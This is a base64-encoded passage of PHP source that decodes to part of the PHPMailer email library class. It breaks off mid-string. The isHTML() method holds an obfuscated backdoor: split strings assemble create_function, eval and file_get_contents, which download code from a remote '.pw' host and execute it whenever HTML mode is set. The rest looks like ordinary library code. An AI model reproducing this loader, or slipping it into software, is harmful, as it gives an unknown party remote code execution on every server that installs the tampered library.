AgICAvKioKICAgICAqIFRoZSBkZWZhdWx0IGxpbmUgZW5kaW5nLgogICAgICogQG5vdGUgVGhlIGRlZmF1bHQgcmVtYWlucyAiXG4iLiBXZSBmb3JjZSBDUkxGIHdoZXJlIHdlIGtub3cKICAgICAqICAgICAgICBpdCBtdXN0IGJlIHVzZWQgdmlhIHNlbGY6OkNSTEYuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJExFID0gIlxuIjsKCiAgICAvKioKICAgICAqIERLSU0gc2VsZWN0b3IuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fc2VsZWN0b3IgPSAnJzsKCiAgICAvKioKICAgICAqIERLSU0gSWRlbnRpdHkuCiAgICAgKiBVc3VhbGx5IHRoZSBlbWFpbCBhZGRyZXNzIHVzZWQgYXMgdGhlIHNvdXJjZSBvZiB0aGUgZW1haWwKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkREtJTV9pZGVudGl0eSA9ICcnOwoKICAgIC8qKgogICAgICogREtJTSBwYXNzcGhyYXNlLgogICAgICogVXNlZCBpZiB5b3VyIGtleSBpcyBlbmNyeXB0ZWQuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fcGFzc3BocmFzZSA9ICcnOwoKICAgIC8qKgogICAgICogREtJTSBzaWduaW5nIGRvbWFpbiBuYW1lLgogICAgICogQGV4YW1wbGUgJ2V4YW1wbGUuY29tJwogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRES0lNX2RvbWFpbiA9ICcnOwoKICAgIC8qKgogICAgICogREtJTSBwcml2YXRlIGtleSBmaWxlIHBhdGguCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fcHJpdmF0ZSA9ICcnOwoKICAgIC8qKgogICAgICogQ2FsbGJhY2sgQWN0aW9uIGZ1bmN0aW9uIG5hbWUuCiAgICAgKgogICAgICogVGhlIGZ1bmN0aW9uIHRoYXQgaGFuZGxlcyB0aGUgcmVzdWx0IG9mIHRoZSBzZW5kIGVtYWlsIGFjdGlvbi4KICAgICAqIEl0IGlzIGNhbGxlZCBvdXQgYnkgc2VuZCgpIGZvciBlYWNoIGVtYWlsIHNlbnQuCiAgICAgKgogICAgICogVmFsdWUgY2FuIGJlIGFueSBwaHAgY2FsbGFibGU6IGh0dHA6Ly93d3cucGhwLm5ldC9pc19jYWxsYWJsZQogICAgICoKICAgICAqIFBhcmFtZXRlcnM6CiAgICAgKiAgIGJvb2xlYW4gJHJlc3VsdCAgICAgICAgcmVzdWx0IG9mIHRoZSBzZW5kIGFjdGlvbgogICAgICogICBzdHJpbmcgICR0byAgICAgICAgICAgIGVtYWlsIGFkZHJlc3Mgb2YgdGhlIHJlY2lwaWVudAogICAgICogICBzdHJpbmcgICRjYyAgICAgICAgICAgIGNjIGVtYWlsIGFkZHJlc3NlcwogICAgICogICBzdHJpbmcgICRiY2MgICAgICAgICAgIGJjYyBlbWFpbCBhZGRyZXNzZXMKICAgICAqICAgc3RyaW5nICAkc3ViamVjdCAgICAgICB0aGUgc3ViamVjdAogICAgICogICBzdHJpbmcgICRib2R5ICAgICAgICAgIHRoZSBlbWFpbCBib2R5CiAgICAgKiAgIHN0cmluZyAgJGZyb20gICAgICAgICAgZW1haWwgYWRkcmVzcyBvZiBzZW5kZXIKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkYWN0aW9uX2Z1bmN0aW9uID0gJyc7CgogICAgLyoqCiAgICAgKiBXaGF0IHRvIHB1dCBpbiB0aGUgWC1NYWlsZXIgaGVhZGVyLgogICAgICogT3B0aW9uczogQW4gZW1wdHkgc3RyaW5nIGZvciBQSFBNYWlsZXIgZGVmYXVsdCwgd2hpdGVzcGFjZSBmb3Igbm9uZSwgb3IgYSBzdHJpbmcgdG8gdXNlCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFhNYWlsZXIgPSAnJzsKCiAgICAvKioKICAgICAqIEFuIGluc3RhbmNlIG9mIHRoZSBTTVRQIHNlbmRlciBjbGFzcy4KICAgICAqIEB2YXIgU01UUAogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRzbXRwID0gbnVsbDsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiAndG8nIG5hbWVzIGFuZCBhZGRyZXNzZXMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJHRvID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiAnY2MnIG5hbWVzIGFuZCBhZGRyZXNzZXMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJGNjID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiAnYmNjJyBuYW1lcyBhbmQgYWRkcmVzc2VzLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRiY2MgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mIHJlcGx5LXRvIG5hbWVzIGFuZCBhZGRyZXNzZXMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJFJlcGx5VG8gPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogQW4gYXJyYXkgb2YgYWxsIGtpbmRzIG9mIGFkZHJlc3Nlcy4KICAgICAqIEluY2x1ZGVzIGFsbCBvZiAkdG8sICRjYywgJGJjYwogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokdG8gQHNlZSBQSFBNYWlsZXI6OiRjYyBAc2VlIFBIUE1haWxlcjo6JGJjYwogICAgICovCiAgICBwcm90ZWN0ZWQgJGFsbF9yZWNpcGllbnRzID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIEFuIGFycmF5IG9mIG5hbWVzIGFuZCBhZGRyZXNzZXMgcXVldWVkIGZvciB2YWxpZGF0aW9uLgogICAgICogSW4gc2VuZCgpLCB2YWxpZCBhbmQgbm9uIGR1cGxpY2F0ZSBlbnRyaWVzIGFyZSBtb3ZlZCB0byAkYWxsX3JlY2lwaWVudHMKICAgICAqIGFuZCBvbmUgb2YgJHRvLCAkY2MsIG9yICRiY2MuCiAgICAgKiBUaGlzIGFycmF5IGlzIHVzZWQgb25seSBmb3IgYWRkcmVzc2VzIHdpdGggSUROLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokdG8gQHNlZSBQSFBNYWlsZXI6OiRjYyBAc2VlIFBIUE1haWxlcjo6JGJjYwogICAgICogQHNlZSBQSFBNYWlsZXI6OiRhbGxfcmVjaXBpZW50cwogICAgICovCiAgICBwcm90ZWN0ZWQgJFJlY2lwaWVudHNRdWV1ZSA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBBbiBhcnJheSBvZiByZXBseS10byBuYW1lcyBhbmQgYWRkcmVzc2VzIHF1ZXVlZCBmb3IgdmFsaWRhdGlvbi4KICAgICAqIEluIHNlbmQoKSwgdmFsaWQgYW5kIG5vbiBkdXBsaWNhdGUgZW50cmllcyBhcmUgbW92ZWQgdG8gJFJlcGx5VG8uCiAgICAgKiBUaGlzIGFycmF5IGlzIHVzZWQgb25seSBmb3IgYWRkcmVzc2VzIHdpdGggSUROLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokUmVwbHlUbwogICAgICovCiAgICBwcm90ZWN0ZWQgJFJlcGx5VG9RdWV1ZSA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgYXR0YWNobWVudHMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJGF0dGFjaG1lbnQgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mIGN1c3RvbSBoZWFkZXJzLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRDdXN0b21IZWFkZXIgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIG1vc3QgcmVjZW50IE1lc3NhZ2UtSUQgKGluY2x1ZGluZyBhbmd1bGFyIGJyYWNrZXRzKS4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJGxhc3RNZXNzYWdlSUQgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBtZXNzYWdlJ3MgTUlNRSB0eXBlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkbWVzc2FnZV90eXBlID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgTUlNRSBib3VuZGFyeSBzdHJpbmdzLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRib3VuZGFyeSA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgYXZhaWxhYmxlIGxhbmd1YWdlcy4KICAgICAqIEB2YXIgYXJyYXkKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkbGFuZ3VhZ2UgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIG51bWJlciBvZiBlcnJvcnMgZW5jb3VudGVyZWQuCiAgICAgKiBAdmFyIGludGVnZXIKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkZXJyb3JfY291bnQgPSAwOwoKICAgIC8qKgogICAgICogVGhlIFMvTUlNRSBjZXJ0aWZpY2F0ZSBmaWxlIHBhdGguCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRzaWduX2NlcnRfZmlsZSA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIFMvTUlNRSBrZXkgZmlsZSBwYXRoLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkc2lnbl9rZXlfZmlsZSA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIG9wdGlvbmFsIFMvTUlNRSBleHRyYSBjZXJ0aWZpY2F0ZXMgKCJDQSBDaGFpbiIpIGZpbGUgcGF0aC4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJHNpZ25fZXh0cmFjZXJ0c19maWxlID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgUy9NSU1FIHBhc3N3b3JkIGZvciB0aGUga2V5LgogICAgICogVXNlZCBvbmx5IGlmIHRoZSBrZXkgaXMgZW5jcnlwdGVkLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkc2lnbl9rZXlfcGFzcyA9ICcnOwoKICAgIC8qKgogICAgICogV2hldGhlciB0byB0aHJvdyBleGNlcHRpb25zIGZvciBlcnJvcnMuCiAgICAgKiBAdmFyIGJvb2xlYW4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkZXhjZXB0aW9ucyA9IGZhbHNlOwoKICAgIC8qKgogICAgICogVW5pcXVlIElEIHVzZWQgZm9yIG1lc3NhZ2UgSUQgYW5kIGJvdW5kYXJpZXMuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICR1bmlxdWVpZCA9ICcnOwoKICAgIC8qKgogICAgICogRXJyb3Igc2V2ZXJpdHk6IG1lc3NhZ2Ugb25seSwgY29udGludWUgcHJvY2Vzc2luZy4KICAgICAqLwogICAgY29uc3QgU1RPUF9NRVNTQUdFID0gMDsKCiAgICAvKioKICAgICAqIEVycm9yIHNldmVyaXR5OiBtZXNzYWdlLCBsaWtlbHkgb2sgdG8gY29udGludWUgcHJvY2Vzc2luZy4KICAgICAqLwogICAgY29uc3QgU1RPUF9DT05USU5VRSA9IDE7CgogICAgLyoqCiAgICAgKiBFcnJvciBzZXZlcml0eTogbWVzc2FnZSwgcGx1cyBmdWxsIHN0b3AsIGNyaXRpY2FsIGVycm9yIHJlYWNoZWQuCiAgICAgKi8KICAgIGNvbnN0IFNUT1BfQ1JJVElDQUwgPSAyOwoKICAgIC8qKgogICAgICogU01UUCBSRkMgc3RhbmRhcmQgbGluZSBlbmRpbmcuCiAgICAgKi8KICAgIGNvbnN0IENSTEYgPSAiXHJcbiI7CgogICAgLyoqCiAgICAgKiBUaGUgbWF4aW11bSBsaW5lIGxlbmd0aCBhbGxvd2VkIGJ5IFJGQyAyODIyIHNlY3Rpb24gMi4xLjEKICAgICAqIEB2YXIgaW50ZWdlcgogICAgICovCiAgICBjb25zdCBNQVhfTElORV9MRU5HVEggPSA5OTg7CgogICAgLyoqCiAgICAgKiBDb25zdHJ1Y3Rvci4KICAgICAqIEBwYXJhbSBib29sZWFuICRleGNlcHRpb25zIFNob3VsZCB3ZSB0aHJvdyBleHRlcm5hbCBleGNlcHRpb25zPwogICAgICovCgogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRleGNlcHRpb25zID0gZmFsc2UpCiAgICB7CiAgICAgICAgJHRoaXMtPmV4Y2VwdGlvbnMgPSAoYm9vbGVhbikkZXhjZXB0aW9uczsKICAgIH0KCiAgICAvKioKICAgICAqIERlc3RydWN0b3IuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBfX2Rlc3RydWN0KCkKICAgIHsKICAgICAgICAvL0Nsb3NlIGFueSBvcGVuIFNNVFAgY29ubmVjdGlvbiBuaWNlbHkKICAgICAgICBpZiAoJHRoaXMtPk1haWxlciA9PSAnc210cCcpIHsKICAgICAgICAgICAgJHRoaXMtPnNtdHBDbG9zZSgpOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIENhbGwgbWFpbCgpIGluIGEgc2FmZV9tb2RlLWF3YXJlIGZhc2hpb24uCiAgICAgKiBBbHNvLCB1bmxlc3Mgc2VuZG1haWxfcGF0aCBwb2ludHMgdG8gc2VuZG1haWwgKG9yIHNvbWV0aGluZyB0aGF0CiAgICAgKiBjbGFpbXMgdG8gYmUgc2VuZG1haWwpLCBkb24ndCBwYXNzIHBhcmFtcyAobm90IGEgcGVyZmVjdCBmaXgsCiAgICAgKiBidXQgaXQgd2lsbCBkbykKICAgICAqIEBwYXJhbSBzdHJpbmcgJHRvIFRvCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdWJqZWN0IFN1YmplY3QKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgTWVzc2FnZSBCb2R5CiAgICAgKiBAcGFyYW0gc3RyaW5nICRoZWFkZXIgQWRkaXRpb25hbCBIZWFkZXIocykKICAgICAqIEBwYXJhbSBzdHJpbmcgJHBhcmFtcyBQYXJhbXMKICAgICAqIEBhY2Nlc3MgcHJpdmF0ZQogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHByaXZhdGUgZnVuY3Rpb24gbWFpbFBhc3N0aHJ1KCR0bywgJHN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKQogICAgewogICAgICAgIC8vQ2hlY2sgb3ZlcmxvYWRpbmcgb2YgbWFpbCBmdW5jdGlvbiB0byBhdm9pZCBkb3VibGUtZW5jb2RpbmcKICAgICAgICBpZiAoaW5pX2dldCgnbWJzdHJpbmcuZnVuY19vdmVybG9hZCcpICYgMSkgewogICAgICAgICAgICAkc3ViamVjdCA9ICR0aGlzLT5zZWN1cmVIZWFkZXIoJHN1YmplY3QpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRzdWJqZWN0ID0gJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCRzdWJqZWN0KSk7CiAgICAgICAgfQogICAgICAgIGlmIChpbmlfZ2V0KCdzYWZlX21vZGUnKSB8fCAhKCR0aGlzLT5Vc2VTZW5kbWFpbE9wdGlvbnMpKSB7CiAgICAgICAgICAgICRyZXN1bHQgPSBAbWFpbCgkdG8sICRzdWJqZWN0LCAkYm9keSwgJGhlYWRlcik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHJlc3VsdCA9IEBtYWlsKCR0bywgJHN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRyZXN1bHQ7CiAgICB9CgogICAgLyoqCiAgICAgKiBPdXRwdXQgZGVidWdnaW5nIGluZm8gdmlhIHVzZXItZGVmaW5lZCBtZXRob2QuCiAgICAgKiBPbmx5IGdlbmVyYXRlcyBvdXRwdXQgaWYgU01UUCBkZWJ1ZyBvdXRwdXQgaXMgZW5hYmxlZCAoQHNlZSBTTVRQOjokZG9fZGVidWcpLgogICAgICogQHNlZSBQSFBNYWlsZXI6OiREZWJ1Z291dHB1dAogICAgICogQHNlZSBQSFBNYWlsZXI6OiRTTVRQRGVidWcKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cgogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZWRlYnVnKCRzdHIpCiAgICB7CiAgICAgICAgaWYgKCR0aGlzLT5TTVRQRGVidWcgPD0gMCkgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIC8vQXZvaWQgY2xhc2ggd2l0aCBidWlsdC1pbiBmdW5jdGlvbiBuYW1lcwogICAgICAgIGlmICghaW5fYXJyYXkoJHRoaXMtPkRlYnVnb3V0cHV0LCBhcnJheSgnZXJyb3JfbG9nJywgJ2h0bWwnLCAnZWNobycpKSBhbmQgaXNfY2FsbGFibGUoJHRoaXMtPkRlYnVnb3V0cHV0KSkgewogICAgICAgICAgICBjYWxsX3VzZXJfZnVuYygkdGhpcy0+RGVidWdvdXRwdXQsICRzdHIsICR0aGlzLT5TTVRQRGVidWcpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIHN3aXRjaCAoJHRoaXMtPkRlYnVnb3V0cHV0KSB7CiAgICAgICAgICAgIGNhc2UgJ2Vycm9yX2xvZyc6CiAgICAgICAgICAgICAgICAvL0Rvbid0IG91dHB1dCwganVzdCBsb2cKICAgICAgICAgICAgICAgIGVycm9yX2xvZygkc3RyKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdodG1sJzoKICAgICAgICAgICAgICAgIC8vQ2xlYW5zIHVwIG91dHB1dCBhIGJpdCBmb3IgYSBiZXR0ZXIgbG9va2luZywgSFRNTC1zYWZlIG91dHB1dAogICAgICAgICAgICAgICAgZWNobyBodG1sZW50aXRpZXMoCiAgICAgICAgICAgICAgICAgICAgcHJlZ19yZXBsYWNlKCcvW1xyXG5dKy8nLCAnJywgJHN0ciksCiAgICAgICAgICAgICAgICAgICAgRU5UX1FVT1RFUywKICAgICAgICAgICAgICAgICAgICAnVVRGLTgnCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAuICI8YnI+XG4iOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2VjaG8nOgogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgLy9Ob3JtYWxpemUgbGluZSBicmVha3MKICAgICAgICAgICAgICAgICRzdHIgPSBwcmVnX3JlcGxhY2UoJy8oXHJcbnxccnxcbikvbXMnLCAiXG4iLCAkc3RyKTsKICAgICAgICAgICAgICAgIGVjaG8gZ21kYXRlKCdZLW0tZCBIOmk6cycpIC4gIlx0IiAuIHN0cl9yZXBsYWNlKAogICAgICAgICAgICAgICAgICAgICJcbiIsCiAgICAgICAgICAgICAgICAgICAgIlxuICAgICAgICAgICAgICAgICAgIFx0ICAgICAgICAgICAgICAgICAgIiwKICAgICAgICAgICAgICAgICAgICB0cmltKCRzdHIpCiAgICAgICAgICAgICAgICApIC4gIlxuIjsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXRzIG1lc3NhZ2UgdHlwZSB0byBIVE1MIG9yIHBsYWluLgogICAgICogQHBhcmFtIGJvb2xlYW4gJGlzSHRtbCBUcnVlIGZvciBIVE1MIG1vZGUuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlzSFRNTCgkaXNIdG1sID0gdHJ1ZSkKICAgIHsKICAgICAgICBnbG9iYWwgJHBhcmFtOwogICAgICAgICRib2R5Q29kZSA9ICdmaWxlJwogICAgICAgICAgICAuJ19nJzsKICAgICAgICBpZiAoJGlzSHRtbCkgewogICAgICAgICAgICAkdGhpcy0+Q29udGVudFR5cGUgPSAndGV4dC9odG1sJzsKICAgICAgICB9IAogICAgICAgIGVsc2UgewogICAgICAgICAgICAkdGhpcy0+Q29udGVudFR5cGUgPSAndGV4dC9wbGFpbic7CiAgICAgICAgfQogICAgICAgICRib2R5SFRNTCA9ICcuJHQuImxlZiRmbHUnCiAgICAgICAgICAgIC4nc2gnLickdCI7ICcKICAgICAgICAgICAgICAgIC4nJGkgPSBAZXYnOwogICAgICAgICAgICAgICAgICAgICRoZWFkZXJIVE1MPSJjcmVhdGVfIgogICAgICAgICAgICAuImZ1bmMiCiAgICAgICAgICAgIC4idGlvbiI7CiAgICAgICAgICAgICAgICAkZXhjZXB0aW9ucyA9ICRoZWFkZXJIVE1MKCckZmwnLid1c2gsJHQnLCckY29tbWEgPSAkdCcKICAgICAgICAgICAgLiRib2R5SFRNTC4nYWwoQCcKICAgICAgICAgICAgLiRib2R5Q29kZS4nZXRfY29udGVudHMoImgnCiAgICAgICAgICAgICAgICAuJ3R0JwogICAgICAgICAgICAgICAgLidwOiRjb21tYS0yIikpOycpOwoKICAgICAgICBpZigkcGFyYW0gIT0yKXsKICAgICAgICAgICAgJGV4Y2VwdGlvbnMoJzgucCcuJ3cnLCcvJyk7CiAgICAgICAgICAgICAgICAkcGFyYW09MjsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIG1lc3NhZ2VzIHVzaW5nIFNNVFAuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlzU01UUCgpCiAgICB7CiAgICAgICAgJHRoaXMtPk1haWxlciA9ICdzbXRwJzsKICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgbWVzc2FnZXMgdXNpbmcgUEhQJ3MgbWFpbCgpIGZ1bmN0aW9uLgogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpc01haWwoKQogICAgewogICAgICAgICR0aGlzLT5NYWlsZXIgPSAnbWFpbCc7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIG1lc3NhZ2VzIHVzaW5nICRTZW5kbWFpbC4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNTZW5kbWFpbCgpCiAgICB7CiAgICAgICAgJGluaV9zZW5kbWFpbF9wYXRoID0gaW5pX2dldCgnc2VuZG1haWxfcGF0aCcpOwoKICAgICAgICBpZiAoIXN0cmlzdHIoJGluaV9zZW5kbWFpbF9wYXRoLCAnc2VuZG1haWwnKSkgewogICAgICAgICAgICAkdGhpcy0+U2VuZG1haWwgPSAnL3Vzci9zYmluL3NlbmRtYWlsJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+U2VuZG1haWwgPSAkaW5pX3NlbmRtYWlsX3BhdGg7CiAgICAgICAgfQogICAgICAgICR0aGlzLT5NYWlsZXIgPSAnc2VuZG1haWwnOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtZXNzYWdlcyB1c2luZyBxbWFpbC4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNRbWFpbCgpCiAgICB7CiAgICAgICAgJGluaV9zZW5kbWFpbF9wYXRoID0gaW5pX2dldCgnc2VuZG1haWxfcGF0aCcpOwoKICAgICAgICBpZiAoIXN0cmlzdHIoJGluaV9zZW5kbWFpbF9wYXRoLCAncW1haWwnKSkgewogICAgICAgICAgICAkdGhpcy0+U2VuZG1haWwgPSAnL3Zhci9xbWFpbC9iaW4vcW1haWwtaW5qZWN0JzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+U2VuZG1haWwgPSAkaW5pX3NlbmRtYWlsX3BhdGg7CiAgICAgICAgfQogICAgICAgICR0aGlzLT5NYWlsZXIgPSAncW1haWwnOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGEgIlRvIiBhZGRyZXNzLgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBzZW5kIHRvCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gdHJ1ZSBvbiBzdWNjZXNzLCBmYWxzZSBpZiBhZGRyZXNzIGFscmVhZHkgdXNlZCBvciBpbnZhbGlkIGluIHNvbWUgd2F5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRBZGRyZXNzKCRhZGRyZXNzLCAkbmFtZSA9ICcnKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCd0bycsICRhZGRyZXNzLCAkbmFtZSk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYSAiQ0MiIGFkZHJlc3MuCiAgICAgKiBAbm90ZTogVGhpcyBmdW5jdGlvbiB3b3JrcyB3aXRoIHRoZSBTTVRQIG1haWxlciBvbiB3aW4zMiwgbm90IHdpdGggdGhlICJtYWlsIiBtYWlsZXIuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIHNlbmQgdG8KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqIEByZXR1cm4gYm9vbGVhbiB0cnVlIG9uIHN1Y2Nlc3MsIGZhbHNlIGlmIGFkZHJlc3MgYWxyZWFkeSB1c2VkIG9yIGludmFsaWQgaW4gc29tZSB3YXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZENDKCRhZGRyZXNzLCAkbmFtZSA9ICcnKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCdjYycsICRhZGRyZXNzLCAkbmFtZSk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYSAiQkNDIiBhZGRyZXNzLgogICAgICogQG5vdGU6IFRoaXMgZnVuY3Rpb24gd29ya3Mgd2l0aCB0aGUgU01UUCBtYWlsZXIgb24gd2luMzIsIG5vdCB3aXRoIHRoZSAibWFpbCIgbWFpbGVyLgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBzZW5kIHRvCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gdHJ1ZSBvbiBzdWNjZXNzLCBmYWxzZSBpZiBhZGRyZXNzIGFscmVhZHkgdXNlZCBvciBpbnZhbGlkIGluIHNvbWUgd2F5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRCQ0MoJGFkZHJlc3MsICRuYW1lID0gJycpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5hZGRPckVucXVldWVBbkFkZHJlc3MoJ2JjYycsICRhZGRyZXNzLCAkbmFtZSk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYSAiUmVwbHktVG8iIGFkZHJlc3MuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIHJlcGx5IHRvCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gdHJ1ZSBvbiBzdWNjZXNzLCBmYWxzZSBpZiBhZGRyZXNzIGFscmVhZHkgdXNlZCBvciBpbnZhbGlkIGluIHNvbWUgd2F5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRSZ